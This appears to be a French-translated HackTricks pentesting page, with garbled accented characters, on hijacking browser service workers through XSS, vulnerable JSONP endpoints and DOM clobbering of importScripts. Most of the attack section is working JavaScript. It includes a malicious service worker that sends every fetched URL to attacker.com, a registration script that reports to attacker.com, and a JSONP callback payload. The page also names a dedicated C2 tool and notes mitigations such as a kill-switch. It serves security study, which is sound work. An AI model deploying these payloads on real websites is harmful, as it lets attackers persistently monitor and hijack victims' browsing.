# Abusing Service Workers

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

Un **service worker** est un script ex√©cut√© par votre navigateur en arri√®re-plan, s√©par√© de toute page web, permettant des fonctionnalit√©s qui ne n√©cessitent pas de page web ou d'interaction utilisateur, am√©liorant ainsi les capacit√©s de **traitement hors ligne et en arri√®re-plan**. Des informations d√©taill√©es sur les service workers peuvent √™tre trouv√©es [ici](https://developers.google.com/web/fundamentals/primers/service-workers). En exploitant les service workers dans un domaine web vuln√©rable, les attaquants peuvent prendre le contr√¥le des interactions de la victime avec toutes les pages de ce domaine.

### Checking for Existing Service Workers

Les service workers existants peuvent √™tre v√©rifi√©s dans la section **Service Workers** de l'onglet **Application** dans les **Outils de d√©veloppement**. Une autre m√©thode consiste √† visiter [chrome://serviceworker-internals](https://chromium.googlesource.com/chromium/src/+/main/docs/security/chrome%3A/serviceworker-internals) pour une vue plus d√©taill√©e.

### Push Notifications

Les **permissions de notification push** impactent directement la capacit√© d'un **service worker** √† communiquer avec le serveur sans interaction directe de l'utilisateur. Si les permissions sont refus√©es, cela limite le potentiel du service worker √† poser une menace continue. √Ä l'inverse, accorder des permissions augmente les risques de s√©curit√© en permettant la r√©ception et l'ex√©cution d'exploits potentiels.

## Attack Creating a Service Worker

Pour exploiter cette vuln√©rabilit√©, vous devez trouver :

* Un moyen de **t√©l√©charger des fichiers JS arbitraires** sur le serveur et un **XSS pour charger le service worker** du fichier JS t√©l√©charg√©
* Une **requ√™te JSONP vuln√©rable** o√π vous pouvez **manipuler la sortie (avec du code JS arbitraire)** et un **XSS** pour **charger le JSONP avec un payload** qui **chargera un service worker malveillant**.

Dans l'exemple suivant, je vais pr√©senter un code pour **enregistrer un nouveau service worker** qui √©coutera l'√©v√©nement `fetch` et **enverra √† l serveur des attaquants chaque URL r√©cup√©r√©e** (c'est le code que vous devez **t√©l√©charger** sur le **serveur** ou charger via une **r√©ponse JSONP vuln√©rable**) :
```javascript
self.addEventListener('fetch', function(e) {
e.respondWith(caches.match(e.request).then(function(response) {
fetch('https://attacker.com/fetch_url/' + e.request.url)
});
```
Et voici le code qui va **enregistrer le worker** (le code que vous devriez √™tre en mesure d'ex√©cuter en abusant d'un **XSS**). Dans ce cas, une requ√™te **GET** sera envoy√©e au serveur des **attaquants** **notifiant** si l'**enregistrement** du service worker a r√©ussi ou non :
```javascript
<script>
window.addEventListener('load', function() {
var sw = "/uploaded/ws_js.js";
navigator.serviceWorker.register(sw, {scope: '/'})
.then(function(registration) {
var xhttp2 = new XMLHttpRequest();
xhttp2.open("GET", "https://attacker.com/SW/success", true);
xhttp2.send();
}, function (err) {
var xhttp2 = new XMLHttpRequest();
xhttp2.open("GET", "https://attacker.com/SW/error", true);
xhttp2.send();
});
});
</script>
```
Dans le cas d'abuser d'un point de terminaison JSONP vuln√©rable, vous devez mettre la valeur √† l'int√©rieur de `var sw`. Par exemple :
```javascript
var sw = "/jsonp?callback=onfetch=function(e){ e.respondWith(caches.match(e.request).then(function(response){ fetch('https://attacker.com/fetch_url/' + e.request.url) }) )}//";
```
Il existe un **C2** d√©di√© √† l'**exploitation des Service Workers** appel√© [**Shadow Workers**](https://shadow-workers.github.io) qui sera tr√®s utile pour abuser de ces vuln√©rabilit√©s.

La **directive de cache de 24 heures** limite la dur√©e de vie d'un **service worker (SW)** malveillant ou compromis √† au maximum 24 heures apr√®s la correction d'une vuln√©rabilit√© XSS, en supposant un statut client en ligne. Pour minimiser la vuln√©rabilit√©, les op√©rateurs de site peuvent r√©duire le Temps de Vie (TTL) du script SW. Il est √©galement conseill√© aux d√©veloppeurs de cr√©er un [**kill-switch pour le service worker**](https://stackoverflow.com/questions/33986976/how-can-i-remove-a-buggy-service-worker-or-implement-a-kill-switch/38980776#38980776) pour une d√©sactivation rapide.

## Abuser de `importScripts` dans un SW via DOM Clobbering

La fonction **`importScripts`** appel√©e depuis un Service Worker peut **importer un script d'un domaine diff√©rent**. Si cette fonction est appel√©e en utilisant un **param√®tre que l'attaquant pourrait** modifier, il serait capable d'**importer un script JS de son domaine** et d'obtenir XSS.

**Cela contourne m√™me les protections CSP.**

**Exemple de code vuln√©rable :**

* **index.html**
```html
<script>
navigator.serviceWorker.register('/dom-invader/testcases/augmented-dom-import-scripts/sw.js' + location.search);
// attacker controls location.search
</script>
```
* **sw.js**
```javascript
const searchParams = new URLSearchParams(location.search);
let host = searchParams.get('host');
self.importScripts(host + "/sw_extra.js");
//host can be controllable by an attacker
```
### Avec le DOM Clobbering

Pour plus d'informations sur ce qu'est le DOM Clobbering, consultez :

{% content-ref url="dom-clobbering.md" %}
[dom-clobbering.md](dom-clobbering.md)
{% endcontent-ref %}

Si l'URL/domaine que le SW utilise pour appeler **`importScripts`** est **√† l'int√©rieur d'un √©l√©ment HTML**, il est **possible de le modifier via le DOM Clobbering** pour faire en sorte que le SW **charge un script depuis votre propre domaine**.

Pour un exemple de cela, consultez le lien de r√©f√©rence.

## R√©f√©rences

* [https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering](https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering)

{% hint style="success" %}
Apprenez et pratiquez le Hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le Hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}
